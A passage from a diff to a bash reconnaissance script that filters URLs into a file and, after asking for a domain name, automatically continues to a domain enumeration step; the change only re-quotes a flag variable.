yht($|\s|\?|&|#|/|\.)' > path5.txt
     sleep 5
     count_urls "path5.txt" "Extensions filtered and URLs cleaned."
 
@@ -2046,8 +2159,10 @@ while true; do
             read -p "Please enter a domain name (example.com): " domain_name
             echo -e "${BOLD_WHITE}You selected: Domain name set to $domain_name${NC}"
             last_completed_option=2
-            proceed_to_step_3=y
+            
             # Automatically proceed to Step 3 after setting the domain name
+            proceed_to_step_3="y"
+
             if [[ "$proceed_to_step_3" =~ ^[Yy]$ ]]; then
                 echo -e "${BOLD_BLUE}Automatically continuing with step 3: Domain Enumeration and Filtering for $domain_name...${NC}"
                 run_step_3
